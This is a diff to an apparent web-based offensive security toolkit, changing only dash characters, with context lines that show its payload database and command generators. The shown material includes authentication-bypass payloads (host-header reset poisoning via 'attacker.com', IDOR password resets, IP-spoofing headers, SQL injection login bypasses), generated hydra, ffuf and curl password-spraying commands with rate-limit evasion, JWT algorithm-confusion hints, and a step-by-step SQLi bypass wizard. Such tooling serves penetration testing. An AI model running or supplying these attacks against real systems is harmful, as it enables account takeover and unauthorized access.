     {payload:"curl -X POST https://target.com/reset -H 'Host: attacker.com' -d 'email=victim@target.com'",desc:"Direct curl test for host poisoning"},
   ],
   reset_linkmanip:[
-    {payload:"# Your reset URL:\nhttps://target.com/reset?token=abc123&user=YOUR_ID\n# Change user ID to admin:\nhttps://target.com/reset?token=abc123&user=1",desc:"IDOR in reset link — change user ID"},
+    {payload:"# Your reset URL:\nhttps://target.com/reset?token=abc123&user=YOUR_ID\n# Change user ID to admin:\nhttps://target.com/reset?token=abc123&user=1",desc:"IDOR in reset link - change user ID"},
     {payload:"https://target.com/reset?token=YOUR_TOKEN&email=admin@target.com",desc:"Use your token for admin email"},
     {payload:"# Test token binding:\n# 1. Get token for yourself\n# 2. Use token + change user param to victim\ncurl 'https://target.com/reset?token=YOURS&user=victim_id'",desc:"Token-user binding test"},
   ],
   reset_idor:[
-    {payload:"PUT /api/users/1/password\n{\"new_password\":\"hacked\"}",desc:"IDOR password reset — target user ID 1 (admin)"},
+    {payload:"PUT /api/users/1/password\n{\"new_password\":\"hacked\"}",desc:"IDOR password reset - target user ID 1 (admin)"},
     {payload:"POST /api/users/1/reset-password",desc:"Direct password reset API for user 1"},
     {payload:"PATCH /api/account -H 'X-User-ID: 1' -d '{\"password\":\"hacked\"}'",desc:"User ID injection via header"},
   ],
@@ -1434,7 +1434,7 @@ const PDB = {
     {payload:"GET /api/user/profile → change id param to admin's ID",desc:"IDOR profile access"},
     {payload:"POST /api/admin/create-user with regular user session",desc:"Access admin function with user session"},
     {payload:"?role=admin appended to any URL",desc:"Role injection in GET param"},
-    {payload:"Modify response: change role from 'user' to 'admin' in Burp proxy",desc:"Response manipulation — modify server response before browser processes"},
+    {payload:"Modify response: change role from 'user' to 'admin' in Burp proxy",desc:"Response manipulation - modify server response before browser processes"},
     {payload:"Add X-Admin: true header",desc:"Custom admin header"},
   ],
   access_authheader:[
@@ -1446,24 +1446,24 @@ const PDB = {
     {payload:"Remove Authorization header entirely",desc:"Test if endpoint works without any auth"},
   ],
   api_bypass:[
-    {payload:"/api/v2/users (try v1, v2, v3 for different auth requirements)",desc:"Version enumeration — older versions may lack auth"},
-    {payload:"/api/internal/users",desc:"Internal API path — often less protected"},
+    {payload:"/api/v2/users (try v1, v2, v3 for different auth requirements)",desc:"Version enumeration - older versions may lack auth"},
+    {payload:"/api/internal/users",desc:"Internal API path - often less protected"},
     {payload:"/api/debug/users",desc:"Debug endpoints"},
     {payload:"/api/users.json",desc:"Add file extension to bypass auth middleware"},
     {payload:"/api/users%2fadmin",desc:"URL encoding to bypass path-based auth"},
-    {payload:"/API/users",desc:"Case variation — case-insensitive routing"},
+    {payload:"/API/users",desc:"Case variation - case-insensitive routing"},
     {payload:"Add Accept: application/json to bypass HTML-only auth",desc:"Content type bypass"},
   ],
   api_broken:[
-    {payload:"Omit Authorization header entirely — API returns 200",desc:"Missing auth check on API route"},
+    {payload:"Omit Authorization header entirely - API returns 200",desc:"Missing auth check on API route"},
     {payload:"Use another user's token for their ID endpoint",desc:"Broken object-level authorization"},
-    {payload:"POST /api/admin — regular user session works",desc:"Missing function-level auth"},
-    {payload:"GET /api/export-all-users — no admin check",desc:"Excessive data exposure"},
-    {payload:"Access /api/v0/* — deprecated version without auth",desc:"Outdated API version bypass"},
+    {payload:"POST /api/admin - regular user session works",desc:"Missing function-level auth"},
+    {payload:"GET /api/export-all-users - no admin check",desc:"Excessive data exposure"},
+    {payload:"Access /api/v0/* - deprecated version without auth",desc:"Outdated API version bypass"},
   ],
   api_leak:[
     {payload:"Response headers: check for X-Auth-Token, Set-Cookie in error responses",desc:"Token leakage in error responses"},
-    {payload:"GET /api/user/me — check if other users' tokens appear",desc:"Cross-user token exposure"},
+    {payload:"GET /api/user/me - check if other users' tokens appear",desc:"Cross-user token exposure"},
     {payload:"Check JavaScript bundle files for hardcoded API keys",desc:"Source code token leakage"},
     {payload:"Browser DevTools → Network → filter by '/api' → look for tokens in URLs",desc:"Token in URL (logged by servers/proxies)"},
     {payload:"Check error responses for stack traces with credentials",desc:"Debug info with credentials"},
@@ -1476,7 +1476,7 @@ const PDB = {
     {payload:"X-Rewrite-URL: /admin",desc:"IIS URL rewrite override"},
   ],
   infra_ip:[
-    {payload:"X-Real-IP: 127.0.0.1",desc:"Fake localhost IP — bypass IP whitelist"},
+    {payload:"X-Real-IP: 127.0.0.1",desc:"Fake localhost IP - bypass IP whitelist"},
     {payload:"X-Forwarded-For: 127.0.0.1",desc:"Forwarded-for localhost"},
     {payload:"X-Forwarded-For: ::1",desc:"IPv6 localhost"},
     {payload:"X-Forwarded-For: 192.168.1.1",desc:"Internal IP range"},
@@ -1485,8 +1485,8 @@ const PDB = {
     {payload:"Client-IP: 127.0.0.1",desc:"Client-IP header"},
   ],
   infra_cache:[
-    {payload:"GET /admin?cb=RANDOM_STRING",desc:"Cache buster — get fresh response (not cached 403)"},
-    {payload:"GET /admin with X-Forwarded-Host: cache-key-manipulator.com",desc:"Cache key injection — cache poisoned version"},
+    {payload:"GET /admin?cb=RANDOM_STRING",desc:"Cache buster - get fresh response (not cached 403)"},
+    {payload:"GET /admin with X-Forwarded-Host: cache-key-manipulator.com",desc:"Cache key injection - cache poisoned version"},
     {payload:"Vary header abuse: add Accept-Language to get different cache buckets",desc:"Vary header manipulation"},
     {payload:"GET /admin (authenticated) → cache it → GET /admin (unauth) from different IP",desc:"Cache the authenticated response, serve to unauthenticated users"},
   ],
@@ -1496,39 +1496,39 @@ const PDB = {
     {payload:"Burp Turbo Intruder → race.py template → target the auth endpoint",desc:"Turbo Intruder race condition"},
   ],
   adv_unicode:[
-    {payload:"ℕ or ℤ unicode chars that normalize to regular letters",desc:"Unicode normalization — Ⓐ normalizes to A"},
+    {payload:"ℕ or ℤ unicode chars that normalize to regular letters",desc:"Unicode normalization - Ⓐ normalizes to A"},
     {payload:"admin%c0%af → admin (IIS Unicode bypass)",desc:"IIS Unicode path bypass"},
     {payload:"ᴬᴰᴹᴵᴺ (superscript unicode 'ADMIN')",desc:"Unicode case confusion"},
     {payload:"admin\\u0000",desc:"Unicode null byte"},
     {payload:"ａｄｍｉｎ (full-width unicode)",desc:"Full-width characters"},
-    {payload:"аdmin (Cyrillic а instead of Latin a)",desc:"Lookalike character bypass — homograph attack"},
+    {payload:"аdmin (Cyrillic а instead of Latin a)",desc:"Lookalike character bypass - homograph attack"},
   ],
   adv_nullbyte:[
     {payload:"admin%00",desc:"URL-encoded null byte after username"},
     {payload:"admin\\x00",desc:"Raw null byte"},
-    {payload:"admin%00@target.com",desc:"Null byte in email — truncate after admin"},
+    {payload:"admin%00@target.com",desc:"Null byte in email - truncate after admin"},
     {payload:"password%00injecteddata",desc:"Null byte truncation in password"},
     {payload:"admin%00' OR '1'='1",desc:"Null byte + SQLi (bypass input filters)"},
   ],
   adv_case:[
-    {payload:"Admin",desc:"Title case — some systems case-sensitive on display but not auth"},
+    {payload:"Admin",desc:"Title case - some systems case-sensitive on display but not auth"},
     {payload:"ADMIN",desc:"All uppercase"},
     {payload:"aDmIn",desc:"Mixed case"},
-    {payload:"admin (with trailing spaces)",desc:"Trailing whitespace — may match DB entry with trimming"},
-    {payload:"ADMIN@DOMAIN.COM",desc:"Uppercase email — case-insensitive email match"},
+    {payload:"admin (with trailing spaces)",desc:"Trailing whitespace - may match DB entry with trimming"},
+    {payload:"ADMIN@DOMAIN.COM",desc:"Uppercase email - case-insensitive email match"},
     {payload:"Admin@Domain.Com",desc:"Mixed case email"},
   ],
   adv_legacy:[
-    {payload:"/api/v0/login",desc:"Version 0 — often less hardened"},
-    {payload:"/api/v1/login",desc:"Version 1 — legacy"},
+    {payload:"/api/v0/login",desc:"Version 0 - often less hardened"},
+    {payload:"/api/v1/login",desc:"Version 1 - legacy"},
     {payload:"/api/beta/login",desc:"Beta endpoint"},
-    {payload:"/api/test/login",desc:"Test endpoint — often no rate limiting"},
-    {payload:"/api/dev/login",desc:"Dev endpoint — may skip auth entirely"},
+    {payload:"/api/test/login",desc:"Test endpoint - often no rate limiting"},
+    {payload:"/api/dev/login",desc:"Dev endpoint - may skip auth entirely"},
     {payload:"/login.old",desc:"Backup login page"},
     {payload:"/auth.php",desc:"Legacy PHP auth"},
     {payload:"/admin/login.php",desc:"Legacy admin login"},
     {payload:"/wp-login.php",desc:"WordPress login (present even on non-WP sites sometimes)"},
-    {payload:"/xmlrpc.php",desc:"WordPress XML-RPC — alternative auth endpoint"},
+    {payload:"/xmlrpc.php",desc:"WordPress XML-RPC - alternative auth endpoint"},
   ],
 };
 
@@ -1685,12 +1685,12 @@ function generateBruteForce(){
   let html=`<div class="divider"></div><div style="font-size:13px;font-weight:600;color:var(--text);margin-bottom:12px">⚡ Generated Commands for: ${esc(url)}</div>`;
 
   // ffuf - password spray
-  html+=`<div class="card" style="margin-bottom:12px"><div class="card-header"><div class="card-title">🎯 ffuf — Password Spray (Known Username)</div><span class="tag tag-green">RECOMMENDED</span></div><div class="card-body">`;
+  html+=`<div class="card" style="margin-bottom:12px"><div class="card-header"><div class="card-title">🎯 ffuf - Password Spray (Known Username)</div><span class="tag tag-green">RECOMMENDED</span></div><div class="card-body">`;
   html+=makeCmdBlock(`ffuf -u '${url}' -X ${method} ${ffufBody} ${headerFlags} -w /usr/share/wordlists/rockyou.txt${failstr?` -fr '${failstr}'`:''}${successstr?` -mc 302 -fr 'wrong'`:''} -t ${threads}${parseInt(delay)>0?` -p ${parseInt(delay)/1000}`:''}`,`Spray password list against username: ${uname}`);
   html+=`<div class="info-box" style="margin-top:8px"><strong>-fr</strong> filters by regex in response body. <strong>-mc 302</strong> matches redirect on success. Adjust based on app behavior.</div></div></div>`;
 
   // hydra
-  html+=`<div class="card" style="margin-bottom:12px"><div class="card-header"><div class="card-title">🐉 Hydra — Full Attack</div></div><div class="card-body">`;
+  html+=`<div class="card" style="margin-bottom:12px"><div class="card-header"><div class="card-title">🐉 Hydra - Full Attack</div></div><div class="card-body">`;
   if(ctype==='form'||ctype==='multipart'){
     html+=makeCmdBlock(`hydra -l ${uname} -P /usr/share/wordlists/rockyou.txt ${scheme}://${host} http-${method.toLowerCase()}-form '${path}:${ufield}=^USER^&${pfield}=^PASS^:${failstr}' -t ${threads}${parseInt(delay)>0?` -W ${Math.ceil(parseInt(delay)/1000)}`:''}`,`Hydra HTTP POST form brute force`);
     html+=makeCmdBlock(`hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ${scheme}://${host} http-post-form '${path}:${ufield}=^USER^&${pfield}=^PASS^:${failstr}' -t ${threads}`,`Hydra user + password spray`);
@@ -1706,12 +1706,12 @@ function generateBruteForce(){
 
   // curl loop
   html+=`<div class="card" style="margin-bottom:12px"><div class="card-header"><div class="card-title">⚫ Bash Curl Loop (Manual)</div></div><div class="card-body">`;
-  html+=makeCmdBlock(`while IFS= read -r pass; do\n  resp=$(curl -s -o /dev/null -w "%{http_code}" -X ${method} ${curlBody.replace('test123','$pass')} ${headerFlags} '${url}')\n  echo "$pass → $resp"\n  [ "$resp" = "302" ] && echo "✓ SUCCESS: $pass" && break\ndone < /usr/share/wordlists/rockyou.txt`,`Bash curl password spray — stops on 302 redirect`);
+  html+=makeCmdBlock(`while IFS= read -r pass; do\n  resp=$(curl -s -o /dev/null -w "%{http_code}" -X ${method} ${curlBody.replace('test123','$pass')} ${headerFlags} '${url}')\n  echo "$pass → $resp"\n  [ "$resp" = "302" ] && echo "✓ SUCCESS: $pass" && break\ndone < /usr/share/wordlists/rockyou.txt`,`Bash curl password spray - stops on 302 redirect`);
   html+=`</div></div>`;
 
   // Rate-limited evasive
   if(parseInt(delay)>0){
-    html+=`<div class="card" style="margin-bottom:12px"><div class="card-header"><div class="card-title">🐌 Evasive — Rate Limited (${delay}ms delay)</div></div><div class="card-body">`;
+    html+=`<div class="card" style="margin-bottom:12px"><div class="card-header"><div class="card-title">🐌 Evasive - Rate Limited (${delay}ms delay)</div></div><div class="card-body">`;
     html+=makeCmdBlock(`ffuf -u '${url}' -X ${method} ${ffufBody} ${headerFlags} -w /usr/share/wordlists/rockyou.txt -fr '${failstr}' -t 1 -p ${parseInt(delay)/1000}`,`Single-threaded with ${delay}ms delay`);
     html+=makeCmdBlock(`# Also rotate User-Agent per request:\nffuf -u '${url}' -X ${method} ${ffufBody} -w /usr/share/wordlists/rockyou.txt -fr '${failstr}' -H 'User-Agent: FUZZ2' -w agents.txt:FUZZ2 -fr '${failstr}' -t 1 -p ${parseInt(delay)/1000}`,`With User-Agent rotation`);
     html+=`</div></div>`;
@@ -1727,12 +1727,12 @@ function generateBruteForce(){
 
 function initWordlistRef(){
   const wl=[
-    {path:'/usr/share/wordlists/rockyou.txt',desc:'rockyou.txt — 14M passwords — most common wordlist'},
+    {path:'/usr/share/wordlists/rockyou.txt',desc:'rockyou.txt - 14M passwords - most common wordlist'},
     {path:'/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt',desc:'Top 1M passwords'},
-    {path:'/usr/share/seclists/Usernames/top-usernames-shortlist.txt',desc:'Top usernames — admin, root, test, user, etc.'},
+    {path:'/usr/share/seclists/Usernames/top-usernames-shortlist.txt',desc:'Top usernames - admin, root, test, user, etc.'},
     {path:'/usr/share/seclists/Usernames/Names/names.txt',desc:'Common first names as usernames'},
     {path:'/usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv',desc:'Default credentials by service'},
-    {path:'https://github.com/danielmiessler/SecLists',desc:'SecLists GitHub — comprehensive wordlist collection'},
+    {path:'https://github.com/danielmiessler/SecLists',desc:'SecLists GitHub - comprehensive wordlist collection'},
     {path:"crunch 6 6 0123456789 -o digits6.txt",desc:'Generate all 6-digit numeric codes with crunch'},
     {path:"crunch 4 8 abcdefghijklmnopqrstuvwxyz0123456789 -o alphanum.txt",desc:'Generate alphanumeric 4-8 char wordlist'},
   ];
@@ -1827,7 +1827,7 @@ function parseRequest(){
 
   // SQLi payloads
   const sqliPayloads=[`' OR '1'='1'-- -`,"' OR 1=1-- -","admin'-- -","' OR ''='","1 OR 1=1-- -"];
-  html+=`<div class="card" style="margin-bottom:12px"><div class="card-header"><div class="card-title">② SQL Injection Bypass — Auto-Generated</div></div><div class="card-body">`;
+  html+=`<div class="card" style="margin-bottom:12px"><div class="card-header"><div class="card-title">② SQL Injection Bypass - Auto-Generated</div></div><div class="card-body">`;
   sqliPayloads.forEach(p=>{
     const body=isJSON?`'{"${userField}":"${p.replace(/'/g,"'")}","${passField}":"anything"${extraBody?','+extraBody:''}}'`:`'${userField}=${encodeURIComponent(p)}&${passField}=anything${extraBody?'&'+extraBody:''}'`;
     html+=makeCmdBlock(`curl -s -X ${method} '${url}' ${headerFlags} -d ${body}`);
@@ -1933,7 +1933,7 @@ function b64urlEncode(str){
 
 function decodeJWT(){
   const token=document.getElementById('jwt-input').value.trim();
-  if(!token){document.getElementById('jwt-header').textContent='—';document.getElementById('jwt-payload').textContent='—';return;}
+  if(!token){document.getElementById('jwt-header').textContent='-';document.getElementById('jwt-payload').textContent='-';return;}
   const parts=token.split('.');
   if(parts.length<2){document.getElementById('jwt-header').textContent='Invalid JWT format';return;}
   try{
@@ -1943,17 +1943,17 @@ function decodeJWT(){
     document.getElementById('jwt-payload').textContent=JSON.stringify(payload,null,2);
 
     let analysis=`<strong>Algorithm:</strong> ${header.alg||'unknown'}<br>`;
-    if(header.alg==='none')analysis+=`<span style="color:var(--red)">⚠ VULNERABLE: algorithm is 'none' — no signature validation</span><br>`;
-    if(header.alg==='HS256')analysis+=`<span style="color:var(--amber)">ℹ HS256: HMAC symmetric — try secret cracking or RS256 confusion</span><br>`;
-    if(header.alg==='RS256')analysis+=`<span style="color:var(--blue)">ℹ RS256: asymmetric — try alg confusion attack (change to HS256 + sign with public key)</span><br>`;
+    if(header.alg==='none')analysis+=`<span style="color:var(--red)">⚠ VULNERABLE: algorithm is 'none' - no signature validation</span><br>`;
+    if(header.alg==='HS256')analysis+=`<span style="color:var(--amber)">ℹ HS256: HMAC symmetric - try secret cracking or RS256 confusion</span><br>`;
+    if(header.alg==='RS256')analysis+=`<span style="color:var(--blue)">ℹ RS256: asymmetric - try alg confusion attack (change to HS256 + sign with public key)</span><br>`;
     if(payload.exp){
       const exp=new Date(payload.exp*1000);
       const expired=exp<new Date();
-      analysis+=`<strong>Expires:</strong> ${exp.toISOString()} — ${expired?'<span style="color:var(--red)">EXPIRED — may still be accepted by vulnerable apps</span>':'<span style="color:var(--green)">VALID</span>'}<br>`;
+      analysis+=`<strong>Expires:</strong> ${exp.toISOString()} - ${expired?'<span style="color:var(--red)">EXPIRED - may still be accepted by vulnerable apps</span>':'<span style="color:var(--green)">VALID</span>'}<br>`;
     }
     if(payload.iat)analysis+=`<strong>Issued:</strong> ${new Date(payload.iat*1000).toISOString()}<br>`;
     Object.keys(payload).filter(k=>['admin','role','isAdmin','type','privilege'].some(a=>k.toLowerCase().includes(a))).forEach(k=>{
-      analysis+=`<span style="color:var(--orange)">🎯 Interesting claim: <strong>${esc(k)}</strong> = ${esc(JSON.stringify(payload[k]))} — try modifying this</span><br>`;
+      analysis+=`<span style="color:var(--orange)">🎯 Interesting claim: <strong>${esc(k)}</strong> = ${esc(JSON.stringify(payload[k]))} - try modifying this</span><br>`;
     });
     document.getElementById('jwt-analysis').innerHTML=analysis;
 
@@ -2043,10 +2043,10 @@ let guideType=null,guideStep=0,guideSteps=[];
 
 const WIZARDS={
   sqli:{
-    title:'💉 SQL Injection Login Bypass — Guided Guide',
+    title:'💉 SQL Injection Login Bypass - Guided Guide',
     steps:[
       {title:'Step 1: Detect Injectable Field',desc:"Submit a single quote in the username field. A SQL error = injectable.",payloads:["'","''","' AND '1'='1","' AND '1'='2"],why:"A single quote terminates the SQL string context. If the server reflects a SQL syntax error or behaves differently, the input reaches the database.",fix:"No error? Try double quote, check if error is in page source, try different fields."},
-      {title:'Step 2: Try Comment Truncation',desc:"If you know a username, use it + comment to remove the password check.",payloads:["admin'-- -","admin'#","administrator'-- -","admin'/*"],why:"-- - causes MySQL to ignore everything after. The query becomes: SELECT * FROM users WHERE username='admin' — the password check is gone.",fix:"Try common usernames: admin, administrator, root, user, test, superadmin."},
+      {title:'Step 2: Try Comment Truncation',desc:"If you know a username, use it + comment to remove the password check.",payloads:["admin'-- -","admin'#","administrator'-- -","admin'/*"],why:"-- - causes MySQL to ignore everything after. The query becomes: SELECT * FROM users WHERE username='admin' - the password check is gone.",fix:"Try common usernames: admin, administrator, root, user, test, superadmin."},
       {title:'Step 3: OR Bypass (Unknown Username)',desc:"Make the WHERE clause always true with OR logic.",payloads:["' OR '1'='1'-- -","' OR 1=1-- -","' OR ''=''-- -","' OR 1-- -"],why:"OR '1'='1' is always true, so the entire WHERE clause is true, returning the first user in the database (usually admin).",fix:"If only one account shown: it may be the wrong one. Try ORDER BY to get highest privilege account."},
       {title:'Step 4: Handle Parentheses',desc:"If standard payloads fail, the query may wrap conditions in parentheses.",payloads:["admin')-- -","') OR ('1'='1","admin') OR ('1'='1'-- -","')) OR (('1'='1"],why:"Some queries: WHERE (username='X' AND active=1). You must close the paren before commenting: admin') closes username='admin') and -- - comments out the rest.",fix:"Count the parentheses: each error message often shows the query structure."},
       {title:'Step 5: Double-Quote & Numeric Variants',desc:"If single quotes are filtered, try double quotes or numeric context.",payloads:['"admin"-- -','" OR "1"="1"-- -',"1 OR 1=1-- -","-1 OR 1=1-- -"],why:"Some apps use double quotes in SQL strings, or the user ID field might be numeric (no quotes needed). Always test both contexts.",fix:"Still blocked? Try URL encoding: %27 for single quote, or switch to time-based blind injection."},
@@ -2143,7 +2143,7 @@ init();
 </script>
 
 <footer style="text-align:center;padding:1.5rem;border-top:1px solid var(--mah-border);color:var(--mah-text-secondary);font-size:0.75rem;font-family:'JetBrains Mono',monospace;margin-top:2rem;">
-  Built with <span style="color:#f87171;">&hearts;</span> by Mahdiesta — Offensive Security Toolkit
+  Built with <span style="color:#f87171;">&hearts;</span> by Mahdiesta - Offensive Security Toolkit
 </footer>
 
 </body>
